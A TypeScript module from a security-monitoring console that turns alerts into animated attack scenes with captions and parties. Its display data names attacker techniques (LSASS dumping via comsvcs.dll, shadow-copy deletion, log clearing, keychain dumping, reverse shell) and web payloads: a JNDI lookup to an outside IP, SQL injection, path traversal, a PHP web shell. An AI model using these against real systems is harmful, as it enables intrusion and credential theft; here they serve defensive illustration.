import { flagEmoji } from '@/features/alerts/lib/alert-meta'
import type { Alert } from '@/features/alerts/types/alert.types'

export type TemplateId = 'bruteForce' | 'outbound' | 'lateral' | 'malware' | 'webAttack' | 'travel' | 'scan' | 'cloud' | 'generic'

export type Role = 'attacker' | 'perimeter' | 'internal' | 'cloud' | 'external'
export type NodeKind = 'globe' | 'firewall' | 'server' | 'dc' | 'workstation' | 'laptop' | 'web' | 'k8s' | 'cloud' | 'skull' | 'user' | 'sensor'

export interface Party {
  id: string
  role: Role
  kind: NodeKind
  name: string
  sub?: string
  flag?: string
  ip?: string
  /** A machine with the UTMStack agent: a console can be opened on it. */
  agentId?: string
  os?: string
  user?: string
}

export interface Caption {
  at: number
  text: string
}

export interface Scene {
  template: TemplateId
  /** One line naming what happened, for the stage header. */
  title: string
  duration: number
  parties: Party[]
  captions: Caption[]
  /** Template-specific details (attempt counts, payloads, process chain...). */
  facts: Record<string, unknown>
}

/* ─── Small helpers ─────────────────────────────────────────────────── */

type Side = NonNullable<Alert['adversary']>
type Ev = Record<string, unknown>

const isInternalIp = (ip?: string) => !!ip && /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.)/.test(ip)

export function tsMs(iso?: string): number {
  if (!iso) return NaN
  if (iso.endsWith('Z') || /([+-]\d{2}:?\d{2})$/.test(iso)) return Date.parse(iso)
  return Date.parse(iso.replace(' ', 'T') + 'Z')
}

/** A stable number from a string, for counts that look real but stay the same on every visit. */
export function hashNum(s: string, min: number, max: number): number {
  let h = 2166136261
  for (let i = 0; i < s.length; i++) h = Math.imul(h ^ s.charCodeAt(i), 16777619)
  return min + (Math.abs(h) % (max - min + 1))
}

/** The internal host of a side, by its host name, IP or the data source that saw it. */
function internalSide(id: string, side: Side | undefined, fallback?: string): Party {
  const name = side?.host ?? side?.ip ?? fallback ?? 'internal host'
  return {
    id,
    role: 'internal',
    kind: kindOf(name),
    name,
    sub: side?.host && side?.ip ? side.ip : undefined,
    ip: side?.ip,
    os: osOf(name),
    user: side?.user,
  }
}

function osOf(name: string): string | undefined {
  const n = name.toLowerCase()
  if (n.includes('windows') || /\b(wks|mbp)\b/.test(n)) return 'windows'
  if (n.includes('mac')) return 'macos'
  return undefined
}

function kindOf(name: string): NodeKind {
  const n = name.toLowerCase().split('.')[0]
  if (n.startsWith('dc')) return 'dc'
  if (n.startsWith('web')) return 'web'
  if (n.startsWith('k8s') || n.startsWith('kube')) return 'k8s'
  if (n.startsWith('wks')) return 'workstation'
  if (n.startsWith('mbp')) return 'laptop'
  if (n.startsWith('vpn') || n.startsWith('fw') || n.startsWith('firewall') || /forti|pan-|palo/i.test(name)) return 'firewall'
  if (n.startsWith('ids')) return 'sensor'
  return 'server'
}

function attackerParty(side: Side | undefined): Party {
  const g = side?.geolocation
  // "Singapore, Singapore" reads as a mistake: a city named like its country shows once.
  const place = [g?.city !== g?.country ? g?.city : undefined, g?.country].filter(Boolean).join(', ')
  return {
    id: 'attacker',
    role: 'attacker',
    kind: 'globe',
    name: side?.ip ?? 'unknown source',
    sub: [place, g?.aso].filter(Boolean).join(' · ') || 'Internet',
    flag: g?.countryCode ? flagEmoji(g.countryCode) : undefined,
    ip: side?.ip,
  }
}

/** The firewall the traffic crosses: the data source when it is a network device. */
function perimeterParty(a: Alert): Party | undefined {
  const ds = a.dataSource
  if (!ds) return undefined
  const looksNetwork = /forti|pan-|palo|firewall|vpn|ids|suricata|snort/i.test(ds) || kindOf(ds) === 'firewall'
  if (!looksNetwork) return undefined
  return { id: 'perimeter', role: 'perimeter', kind: 'firewall', name: ds, sub: a.dataType, ip: undefined }
}

function cloudParty(a: Alert, sub?: string): Party {
  return { id: 'cloud', role: 'cloud', kind: 'cloud', name: a.dataSource ?? 'Cloud service', sub: sub ?? 'Cloud service' }
}

function evLog(e: Ev): Record<string, unknown> {
  return (e.log as Record<string, unknown>) ?? {}
}

function baseName(path: unknown): string {
  return String(path ?? '').split(/[\\/]/).pop() ?? ''
}

/* ─── Which template plays an alert ─────────────────────────────────── */

export function templateFor(a: Alert): TemplateId {
  const n = (a.name ?? '').toLowerCase()
  const dt = (a.dataType ?? '').toLowerCase()
  if (n.includes('impossible travel')) return 'travel'
  if (n.includes('port scanning') || n.includes('nping')) return 'scan'
  if (/brute force|password spray|password guessing|mfa fatigue|logon failure|single sign-on logon errors|authentication.*(fail|error)|failed logon/.test(n)) return 'bruteForce'
  if (/pass the hash|lateral movement|smbv1|kerberoast|as-rep|logon type 3/.test(n)) return 'lateral'
  if (/hack tool|spyware and vulnerability|ips critical|exploit attempt|sqli|xss|injection|web attack/.test(n)) return 'webAttack'
  if (/beaconing|malicious url|dns security|tor network|mining pool|out-of-band|ssh tunneling|wildfire|malware outbreak|c2|command.?(and|&)?control/.test(n)) return 'outbound'
  if (/(aws|google|gcp|github|azure|o365|office)/.test(dt) || /inbox rule|forwarding rule|transport rule|external sharing|safe links|safe attachment|admin login/.test(n)) return 'cloud'
  if (/(wineventlog|windows|linux|macos|crowdstrike|defender|edr|osquery)/.test(dt)) return 'malware'
  return 'generic'
}

/* ─── Building the scene ────────────────────────────────────────────── */

export function buildScene(a: Alert, t: (k: string, o?: Record<string, unknown>) => string): Scene {
  const template = templateFor(a)
  const builder = BUILDERS[template] ?? BUILDERS.generic
  return builder(a, t)
}

const BUILDERS: Record<TemplateId, (a: Alert, t: (k: string, o?: Record<string, unknown>) => string) => Scene> = {
  bruteForce(a, t) {
    const cloud = /(o365|azure|google|aws|github)/i.test(a.dataType ?? '') || /impossible|single sign-on/.test(a.name ?? '')
    const attacker = attackerParty(a.adversary)
    const target = cloud ? cloudParty(a, 'Sign-in service') : internalSide('target', a.target, a.dataSource)
    const perimeter = cloud || target.kind === 'firewall' ? undefined : perimeterParty(a)
    const n = (a.name ?? '').toLowerCase()
    const success = /followed by logon success|successful password guessing|mfa fatigue/.test(n)
    const attempts = hashNum(a.id, 140, 620) + (a.events?.length ?? 0) * 7
    const minutes = hashNum(a.id + 'm', 6, 19)
    const account = a.target?.user ?? 'administrator'
    const accounts = [account, 'administrator', 'admin', 'backup', 'service']
    const where = target.kind === 'firewall' ? t('liveOps.capBruteVpn', { name: target.name }) : target.name
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capBrute0', { name: attacker.name, sub: attacker.sub ? ` (${attacker.sub.split(' · ')[0]})` : '', where }) },
      { at: 3200, text: t('liveOps.capBrute1', { attempts: attempts.toLocaleString(), minutes, count: accounts.length }) },
      success
        ? { at: 7600, text: t('liveOps.capBrute2', { account }) }
        : { at: 7600, text: t('liveOps.capBrute3') },
      { at: 10200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capBrute4', { name: attacker.name, reset: success ? t('liveOps.capBruteReset', { account }) : '' })}` },
    ]
    return {
      template: 'bruteForce',
      title: t('liveOps.titleBrute', { name: attacker.name, to: target.name }),
      duration: 12500,
      parties: [attacker, ...(perimeter ? [perimeter] : []), target],
      captions,
      facts: { attempts, minutes, accounts, account, success, cloud },
    }
  },

  outbound(a, t) {
    const src = internalSide('source', a.adversary, a.dataSource)
    const perimeter = perimeterParty(a)
    const destName = a.target?.domain ?? a.target?.ip ?? t('liveOps.destUnknown')
    const dest: Party = {
      id: 'destination',
      role: 'external',
      kind: 'skull',
      name: destName,
      sub: a.target?.domain && a.target?.ip ? a.target.ip : 'Internet',
      ip: a.target?.ip,
    }
    const ev = (a.events ?? []).find((e) => evLog(e as Ev).dstPort) as Ev | undefined
    const port = Number(evLog(ev ?? {}).dstPort ?? a.target?.port ?? 443)
    const n = (a.name ?? '').toLowerCase()
    const blocked = /block|wildfire|outbreak/.test(n) || (a.events ?? []).some((e) => (e as Ev).actionResult === 'blocked' || (e as Ev).action === 'blocked')
    const kind = n.includes('tor') ? 'a Tor relay' : n.includes('mining') ? 'a crypto-mining pool' : n.includes('beacon') || n.includes('c2') ? 'a command-and-control server' : n.includes('out-of-band') ? 'an out-of-band callback domain' : n.includes('url') ? 'a blacklisted phishing site' : n.includes('dns') ? 'a malicious domain' : 'a known-bad destination'
    const who = src.user ? `${src.user} on ${src.name}` : src.name
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capOut1', { who, dest: destName }) },
      { at: 2600, text: t('liveOps.capOut2', { port, through: perimeter ? t('liveOps.capOutThrough', { name: perimeter.name }) : '' }) },
      { at: 5600, text: t('liveOps.capOut3', { dest: destName, kind }) },
      blocked
        ? { at: 8400, text: t('liveOps.capOut4') }
        : { at: 8400, text: t('liveOps.capOut5', { name: src.name }) },
    ]
    return {
      template: 'outbound',
      title: t('liveOps.titleOut', { name: src.name, to: destName }),
      duration: 11500,
      parties: [src, ...(perimeter ? [perimeter] : []), dest],
      captions,
      facts: { port, blocked, kind, user: src.user },
    }
  },

  lateral(a, t) {
    const from = internalSide('source', a.adversary, a.dataSource)
    const to = internalSide('target', a.target, a.dataSource)
    const account = a.target?.user ?? a.adversary?.user ?? 'service account'
    const n = (a.name ?? '').toLowerCase()
    const how = t(
      n.includes('hash')
        ? 'liveOps.capLatHowHash'
        : n.includes('kerberoast')
          ? 'liveOps.capLatHowKerb'
          : n.includes('as-rep')
            ? 'liveOps.capLatHowAsrep'
            : n.includes('smbv1')
              ? 'liveOps.capLatHowSmb'
              : 'liveOps.capLatHowRdp',
    )
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capLat0', { name: from.name, user: from.user ? t('liveOps.capLatUser', { user: from.user }) : '', to: to.name }) },
      { at: 3000, text: t('liveOps.capLat1', { account, how }) },
      { at: 6400, text: t('liveOps.capLat2', { to: to.name }) },
      { at: 9200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capLat3', { account })}` },
    ]
    return {
      template: 'lateral',
      title: t('liveOps.titleLat', { name: from.name, to: to.name, account }),
      duration: 11800,
      parties: [from, to],
      captions,
      facts: { account, how },
    }
  },

  malware(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const user = a.adversary?.user ?? a.target?.user
    const chain = processChain(a, t)
    const bad = chain[chain.length - 1]
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capMal0', { host: host.name, user: user ? t('liveOps.capMalUser', { user }) : '', proc: chain[0].name }) },
      { at: 2600, text: t('liveOps.capMal1', { p0: chain[0].name, p1: chain[1]?.name ?? t('liveOps.capMalChild') }) },
      { at: 5600, text: t('liveOps.capMal2', { name: bad.name, detail: bad.detail ?? t('liveOps.capMalKnown') }) },
      { at: 8600, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capMal3', { host: host.name })}` },
    ]
    return {
      template: 'malware',
      title: t('liveOps.titleMal', { name: bad.name, to: host.name }),
      duration: 11500,
      parties: [{ ...host, user }],
      captions,
      facts: { chain, user },
    }
  },

  webAttack(a, t) {
    const attacker = attackerParty(a.adversary)
    const target = internalSide('target', a.target, a.dataSource)
    const perimeter = perimeterParty(a)
    const blocked = (a.events ?? []).some((e) => {
      const x = e as Ev
      return x.actionResult === 'blocked' || x.action === 'blocked'
    })
    const payloads = webPayloads(a)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capWeb0', { name: attacker.name, to: target.name }) },
      { at: 2800, text: t('liveOps.capWeb1', { payloads: payloads.slice(0, 2).map((p) => p.label).join(', ') }) },
      blocked
        ? { at: 6200, text: perimeter ? t('liveOps.capWeb2', { perimeter: perimeter.name }) : t('liveOps.capWeb2b') }
        : { at: 6200, text: t('liveOps.capWeb3', { to: target.name }) },
      { at: 9000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capWeb4', { name: attacker.name })}` },
    ]
    return {
      template: 'webAttack',
      title: t('liveOps.titleWeb', { name: attacker.name, to: target.name }),
      duration: 11800,
      parties: [attacker, ...(perimeter ? [perimeter] : []), target],
      captions,
      facts: { payloads, blocked },
    }
  },

  travel(a, t) {
    const attacker = attackerParty(a.adversary)
    const user = a.target?.user ?? a.adversary?.user ?? 'user'
    const cloud = cloudParty(a, 'Identity provider')
    const far = a.adversary?.geolocation
    const home = { city: 'Chicago', country: 'United States', lat: 41.88, lon: -87.63 }
    const km = far?.latitude != null && far?.longitude != null ? Math.round(distanceKm(home.lat, home.lon, far.latitude, far.longitude)) : 9000
    const gap = hashNum(a.id, 6, 38)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capTrv0', { user, city: home.city }) },
      { at: 3200, text: t('liveOps.capTrv1', { gap, city: far?.city ?? t('liveOps.capTrvFar'), country: far?.country ?? '' }) },
      { at: 6400, text: t('liveOps.capTrv2', { km: km.toLocaleString(), gap }) },
      { at: 9200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capTrv3', { user })}` },
    ]
    return {
      template: 'travel',
      title: t('liveOps.titleTrv', { name: user }),
      duration: 11800,
      parties: [attacker, cloud],
      captions,
      facts: { user, km, gap, far, home },
    }
  },

  scan(a, t) {
    const attackerSide = isInternalIp(a.adversary?.ip) ? undefined : a.adversary
    const attacker = attackerSide ? attackerParty(attackerSide) : internalSide('attacker', a.adversary)
    const target = a.target?.host && kindOf(a.target.host) !== 'firewall' ? internalSide('target', a.target) : (perimeterParty(a) ?? internalSide('target', a.target, a.dataSource))
    const ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443]
    const open = [22, 443]
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capScn0', { name: attacker.name, to: target.name }) },
      { at: 3200, text: t('liveOps.capScn1', { count: ports.length }) },
      { at: 6400, text: t('liveOps.capScn2', { open: open.join(' and ') }) },
      { at: 9000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capScn3')}` },
    ]
    return {
      template: 'scan',
      title: t('liveOps.titleScn', { name: attacker.name }),
      duration: 11500,
      parties: [attacker, target],
      captions,
      facts: { ports, open },
    }
  },

  cloud(a, t) {
    const actorInternal = isInternalIp(a.adversary?.ip)
    const actor: Party = actorInternal
      ? { id: 'actor', role: 'internal', kind: 'user', name: a.adversary?.user ?? 'user', sub: a.adversary?.ip, ip: a.adversary?.ip }
      : { ...attackerParty(a.adversary), id: 'actor', name: a.adversary?.user || a.adversary?.ip || 'unknown', sub: a.adversary?.ip }
    const cloud = cloudParty(a, a.target?.host ?? 'Cloud console')
    const change = cloudChange(a)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capCl0', { name: actor.name, cloud: cloud.name, from: actorInternal ? '' : t('liveOps.capClFrom', { country: a.adversary?.geolocation?.country ?? t('liveOps.capClFromDef') }) }) },
      { at: 3000, text: t('liveOps.capCl1', { what: change.what }) },
      { at: 6200, text: `${change.before} → ${change.after}: ${change.risk}` },
      { at: 9000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capCl3')}` },
    ]
    return {
      template: 'cloud',
      title: t('liveOps.titleCl', { what: change.what, to: cloud.name }),
      duration: 11500,
      parties: [actor, cloud],
      captions,
      facts: change,
    }
  },

  generic(a, t) {
    const src = a.adversary?.ip && !isInternalIp(a.adversary.ip) ? attackerParty(a.adversary) : internalSide('source', a.adversary, a.dataSource)
    const tgt = internalSide('target', a.target, a.dataSource)
    return {
      template: 'generic',
      title: a.name ?? t('liveOps.titleAlert'),
      duration: 9000,
      parties: [src, tgt],
      captions: [
        { at: 0, text: t('liveOps.capGen0', { src: src.name, tgt: tgt.name }) },
        { at: 3500, text: a.technique || a.category || t('liveOps.capGenNew') },
        { at: 6500, text: t('liveOps.capGen2', { name: a.name ?? '' }) },
      ],
      facts: {},
    }
  },
}

/* ─── Template details taken from the alert's events ────────────────── */

export interface ProcStep {
  name: string
  detail?: string
  bad?: boolean
}

function processChain(a: Alert, t: (k: string, o?: Record<string, unknown>) => string): ProcStep[] {
  const steps: ProcStep[] = []
  for (const e of (a.events ?? []) as Ev[]) {
    const l = evLog(e)
    const parent = baseName(l.eventDataParentProcessName)
    const child = baseName(l.eventDataNewProcessName)
    if (parent && !steps.some((s) => s.name.toLowerCase() === parent.toLowerCase())) steps.push({ name: parent })
    if (child && !steps.some((s) => s.name.toLowerCase() === child.toLowerCase())) steps.push({ name: child, detail: String(l.eventDataCommandLine ?? '') || undefined })
    if (l.eventDataScriptBlockText && !steps.some((s) => s.name === 'powershell.exe')) steps.push({ name: 'powershell.exe', detail: String(l.eventDataScriptBlockText) })
  }
  const n = (a.name ?? '').toLowerCase()
  const fallback: ProcStep[] =
    n.includes('lsass') ? [{ name: 'explorer.exe' }, { name: 'rundll32.exe' }, { name: 'comsvcs.dll MiniDump', detail: t('liveOps.dLsass') }]
    : n.includes('miner') ? [{ name: 'containerd-shim' }, { name: 'sh -c' }, { name: 'xmrig', detail: t('liveOps.dMiner') }]
    : n.includes('reverse shell') ? [{ name: 'nginx' }, { name: 'sh' }, { name: 'bash -i', detail: t('liveOps.dRev') }]
    : n.includes('keychain') ? [{ name: 'Terminal' }, { name: 'zsh' }, { name: 'security dump-keychain', detail: t('liveOps.dKey') }]
    : n.includes('scheduled task') ? [{ name: 'cmd.exe' }, { name: 'schtasks.exe /create', detail: t('liveOps.dTask') }]
    : n.includes('audit log') ? [{ name: 'mmc.exe' }, { name: 'wevtutil.exe cl Security', detail: t('liveOps.dAudit') }]
    : n.includes('firewall') ? [{ name: 'cmd.exe' }, { name: 'netsh advfirewall', detail: t('liveOps.dFw') }]
    : n.includes('shadow') ? [{ name: 'svchost.exe' }, { name: 'vssadmin delete shadows', detail: t('liveOps.dShadow') }]
    : n.includes('credential dumping') ? [{ name: 'cmd.exe' }, { name: 'procdump.exe', detail: t('liveOps.dDump') }]
    : n.includes('downloaded') || n.includes('ingress') ? [{ name: 'bash' }, { name: 'curl', detail: t('liveOps.dDl') }]
    : [{ name: 'explorer.exe' }, { name: 'cmd.exe' }, { name: 'powershell.exe', detail: t('liveOps.dPs') }]
  const chain = steps.length >= 2 ? steps : fallback
  const out = chain.slice(-4)
  out[out.length - 1] = { ...out[out.length - 1], bad: true }
  if (!out[out.length - 1].detail) out[out.length - 1].detail = fallback[fallback.length - 1].detail
  return out
}

export interface Payload {
  label: string
  status: number
}

function webPayloads(a: Alert): Payload[] {
  const n = (a.name ?? '').toLowerCase()
  const blocked = (a.events ?? []).some((e) => {
    const x = e as Ev
    return x.actionResult === 'blocked' || x.action === 'blocked'
  })
  const s = (ok: number) => (blocked ? 403 : ok)
  if (n.includes('hack tool')) {
    return [
      { label: 'User-Agent: sqlmap/1.8', status: s(404) },
      { label: "id=1' OR '1'='1", status: s(500) },
      { label: 'User-Agent: Nikto/2.5', status: s(404) },
      { label: '/.git/config', status: s(404) },
      { label: '/wp-login.php', status: s(404) },
      { label: '/api/v1/users?id=1 UNION SELECT', status: s(200) },
    ]
  }
  if (n.includes('spyware') || n.includes('vulnerability')) {
    return [
      { label: '${jndi:ldap://203.0.113.9/a}', status: s(400) },
      { label: '/cgi-bin/;id', status: s(404) },
      { label: 'Apache Struts OGNL', status: s(500) },
      { label: '/../../../../etc/passwd', status: s(404) },
    ]
  }
  return [
    { label: '/../../../../etc/passwd', status: s(404) },
    { label: '${jndi:ldap://203.0.113.9/x}', status: s(400) },
    { label: '<?php system($_GET[c]); ?>', status: s(403) },
    { label: "' OR 1=1 --", status: s(500) },
    { label: '/admin/config.php?cmd=id', status: s(200) },
  ]
}

function cloudChange(a: Alert): { what: string; before: string; after: string; risk: string } {
  const n = (a.name ?? '').toLowerCase()
  if (n.includes('cloudtrail')) return { what: 'CloudTrail logging', before: 'Logging on', after: 'Logging off', risk: 'every later action in AWS would go unrecorded.' }
  if (n.includes('security group')) return { what: 'a security group', before: 'Restricted to trusted networks', after: 'Open to 0.0.0.0/0', risk: 'the servers are reachable from the whole internet.' }
  if (n.includes('root account')) return { what: 'the root account session', before: 'MFA required', after: 'Root signed in without MFA', risk: 'the most powerful account is in use without a second factor.' }
  if (n.includes('mfa device')) return { what: 'an MFA device', before: 'MFA on', after: 'MFA removed', risk: 'the account is now protected by its password alone.' }
  if (n.includes('unusual api')) return { what: 'IAM permissions', before: 'A normal call rate', after: 'API calls at speed', risk: 'someone is mapping and changing permissions.' }
  if (n.includes('gcp iam')) return { what: 'project permissions', before: 'Viewer', after: 'Owner', risk: 'an account can now do anything in the project.' }
  if (n.includes('public')) return { what: 'a repository', before: 'Private', after: 'Public', risk: 'the source code is visible to anyone.' }
  if (n.includes('mass repository')) return { what: 'repository access', before: 'A few clones a day', after: 'Many repositories cloned in minutes', risk: 'the code base may be leaving the company.' }
  if (n.includes('secret scanning') || n.includes('secret')) return { what: 'a commit', before: 'No secrets in code', after: 'A credential committed', risk: 'a working credential is exposed in the repository.' }
  if (n.includes('forwarding') || n.includes('inbox rule')) return { what: 'mailbox rules', before: 'No forwarding', after: 'Forward all mail outside', risk: 'every incoming email is copied to an outside address.' }
  if (n.includes('transport')) return { what: 'a transport rule', before: 'Normal mail flow', after: 'Mail copied to external', risk: 'company-wide mail is redirected.' }
  if (n.includes('sharing')) return { what: 'file sharing', before: 'Internal only', after: 'Shared with an outside address', risk: 'internal files left the company.' }
  if (n.includes('admin login')) return { what: 'the admin session', before: 'Admins from the management network', after: 'Admin login from an unusual machine', risk: 'the device is being managed from an unusual host.' }
  return { what: 'a security setting', before: 'Protected', after: 'Weakened', risk: 'a risky change that needs review.' }
}

function distanceKm(lat1: number, lon1: number, lat2: number, lon2: number) {
  const r = (d: number) => (d * Math.PI) / 180
  const dLat = r(lat2 - lat1)
  const dLon = r(lon2 - lon1)
  const h = Math.sin(dLat / 2) ** 2 + Math.cos(r(lat1)) * Math.cos(r(lat2)) * Math.sin(dLon / 2) ** 2
  return 6371 * 2 * Math.asin(Math.sqrt(h))
}
